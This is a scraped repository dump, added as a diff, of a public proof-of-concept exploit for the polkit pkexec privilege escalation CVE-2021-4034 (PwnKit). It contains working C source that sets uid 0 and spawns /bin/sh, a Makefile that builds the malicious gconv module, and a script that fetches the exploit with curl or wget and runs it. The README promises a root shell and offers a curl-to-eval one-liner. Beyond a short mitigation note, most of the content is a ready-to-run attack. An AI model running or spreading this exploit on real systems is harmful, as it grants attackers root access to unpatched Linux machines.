@@ -1,0 +1,65 @@
+{
+  "metadata": {
+    "timestamp": 1736710047961,
+    "page": 665,
+    "hasNextPage": true,
+    "endCursor": "Y3Vyc29yOjY3MA==",
+    "completionStatus": "IN_PROGRESS"
+  },
+  "repositories": [
+    {
+      "nameWithOwner": "berdav/CVE-2021-4034",
+      "stars": 1977,
+      "defaultBranch": "main",
+      "files": [
+        {
+          "name": ".gitignore",
+          "type": "blob",
+          "size": 0.111328125,
+          "content": "GCONV_PATH=.\ncve-2021-4034\ngconv-modules\npwnkit.so\ndry-run/dry-run-cve-2021-4034\ndry-run/pwnkit-dry-run.so_data.h\n"
+        },
+        {
+          "name": "LICENSE",
+          "type": "blob",
+          "size": 1.0458984375,
+          "content": "MIT License\n\nCopyright (c) 2022 Davide Berardi\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
+        },
+        {
+          "name": "Makefile",
+          "type": "blob",
+          "size": 0.4580078125,
+          "content": "CFLAGS=-Wall\nTRUE=$(shell which true)\n\n.PHONY: all\nall: pwnkit.so cve-2021-4034 gconv-modules gconvpath\n\n.PHONY: clean\nclean:\n\trm -rf pwnkit.so cve-2021-4034 gconv-modules GCONV_PATH=./\n\tmake -C dry-run clean\n\ngconv-modules:\n\techo \"module UTF-8// PWNKIT// pwnkit 1\" > $@\n\n.PHONY: gconvpath\ngconvpath:\n\tmkdir -p GCONV_PATH=.\n\tcp -f $(TRUE) GCONV_PATH=./pwnkit.so:.\n\npwnkit.so: pwnkit.c\n\t$(CC) $(CFLAGS) --shared -fPIC -o $@ $<\n\n.PHONY: dry-run\ndry-run:\n\tmake -C dry-run\n"
+        },
+        {
+          "name": "README.md",
+          "type": "blob",
+          "size": 3.3388671875,
+          "content": "# CVE-2021-4034\nOne day for the polkit privilege escalation exploit\n\nJust execute `make`, `./cve-2021-4034` and enjoy your root shell.\n\nThe original advisory by the real authors is [here](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)\n\n## PoC\nIf the exploit is working you'll get a root shell immediately:\n\n```bash\nvagrant@ubuntu-impish:~/CVE-2021-4034$ make\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" > gconv-modules\nmkdir -p GCONV_PATH=.\ncp /usr/bin/true GCONV_PATH=./pwnkit.so:.\nvagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034\n# whoami\nroot\n# exit\n```\n\nUpdating polkit on most systems will patch the exploit, therefore you'll get the usage and the program will exit:\n```bash\nvagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034\npkexec --version |\n       --help |\n       --disable-internal-agent |\n       [--user username] PROGRAM [ARGUMENTS...]\n\nSee the pkexec manual page for more details.\nvagrant@ubuntu-impish:~/CVE-2021-4034$\n```\n\n## Dry Run\nTo not execute a shell but just test if the system is vulnerable compile the `dry-run` target.\n\nIf the program exit printing \"root\" it means that your system is vulnerable to the exploit.\n```bash\nvagrant@ubuntu-impish:~/CVE-2021-4034$ make dry-run\n...\nvagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034\nroot\nvagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?\n1\n```\n\nIf your system is not vulnerable it prints an error and exit.\n```bash\nvagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034\npkexec --version |\n       --help |\n       --disable-internal-agent |\n       [--user username] PROGRAM [ARGUMENTS...]\n\nSee the pkexec manual page for more details.\nvagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?\n0\n```\n\n## About Polkit pkexec for Linux\n\nPolkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).\n\n# One-liner commands\n\nYou can easily exploit the system using a single script, downloadable and executable with this command:\n\n```sh\neval \"$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)\"\n```\n\n```bash\nvagrant@ubuntu-impish:~/CVE-2021-4034$ whoami\nvagrant\nvagrant@ubuntu-impish:~/CVE-2021-4034$ eval \"$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)\"\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" > gconv-modules\nmkdir -p GCONV_PATH=.\ncp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.\n# whoami\nroot\n```\n\n# Mitigation\n\nIf no patches are available for your operating system, you can remove the SUID-bit from pkexec as a temporary mitigation.\n```bash\n# chmod 0755 /usr/bin/pkexec\n```\n\nThe exploit then will fail complaining that `pkexec` must have the\nsetuid bit enabled.\n```bash\nvagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ sudo chmod 0755 /usr/bin/pkexec\nvagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ ./cve-2021-4034\nGLib: Cannot convert message: Could not open converter from “UTF-8” to “PWNKIT”\npkexec must be setuid root\n```\n\n"
+        },
+        {
+          "name": "cve-2021-4034.c",
+          "type": "blob",
+          "size": 0.28515625,
+          "content": "#include <unistd.h>\n\nint main(int argc, char **argv)\n{\n\tchar * const args[] = {\n\t\tNULL\n\t};\n\tchar * const environ[] = {\n\t\t\"pwnkit.so:.\",\n\t\t\"PATH=GCONV_PATH=.\",\n\t\t\"SHELL=/lol/i/do/not/exists\",\n\t\t\"CHARSET=PWNKIT\",\n\t\t\"GIO_USE_VFS=\",\n\t\tNULL\n\t};\n\treturn execve(\"/usr/bin/pkexec\", args, environ);\n}\n"
+        },
+        {
+          "name": "cve-2021-4034.sh",
+          "type": "blob",
+          "size": 0.2978515625,
+          "content": "#!/usr/bin/env sh\n\nURL='https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/'\n\nfor EXPLOIT in \"${URL}/cve-2021-4034.c\" \\\n               \"${URL}/pwnkit.c\" \\\n               \"${URL}/Makefile\"\ndo\n    curl -sLO \"$EXPLOIT\" || wget --no-hsts -q \"$EXPLOIT\" -O \"${EXPLOIT##*/}\"\ndone\n\nmake\n\n./cve-2021-4034\n"
+        },
+        {
+          "name": "dry-run",
+          "type": "tree",
+          "content": null
+        },
+        {
+          "name": "pwnkit.c",
+          "type": "blob",
+          "size": 0.3310546875,
+          "content": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid gconv(void) {\n}\n\nvoid gconv_init(void *step)\n{\n\tchar * const args[] = { \"/bin/sh\", NULL };\n\tchar * const environ[] = { \"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/bin\", NULL };\n\tsetuid(0);\n\tsetgid(0);\n\texecve(args[0], args, environ);\n\texit(0);\n}\n"
+        }
+      ]
+    }
+  ]
+}
